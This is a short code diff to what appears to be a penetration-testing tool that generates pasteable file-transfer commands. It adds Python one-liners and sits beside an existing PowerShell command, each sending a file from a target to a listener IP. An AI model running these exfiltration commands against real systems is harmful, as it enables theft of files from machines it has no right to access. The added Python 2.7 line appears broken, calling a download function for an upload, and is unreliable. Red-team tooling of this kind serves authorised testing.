@@ -25,6 +25,7 @@ UploadTo_WinMethods = [
 UploadFrom_WinMethods = [
     'Base64',
     'UploadServer',
+    'Python 3',
     # 'SMB',
     # 'FTP',
     # 'WebDAV',
@@ -646,6 +647,10 @@ def upload_from(args):
                 cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
                 cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                 cmd += 'Invoke-WebRequest -Uri https://' + listen_ip + '/ -Method POST -Body $b64'
+            elif choice == 'Python 3':
+                cmd = 'python3 -c \'import requests;requests.post("http://' + listen_ip + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
+            elif choice == 'Python 2.7':
+                cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listen_ip + ':443/upload",' + args.url.split('/')[-1] + ')\''
             pastables(cmd)
 
             # TERMINATE UPLOAD SERVER WHEN DONE
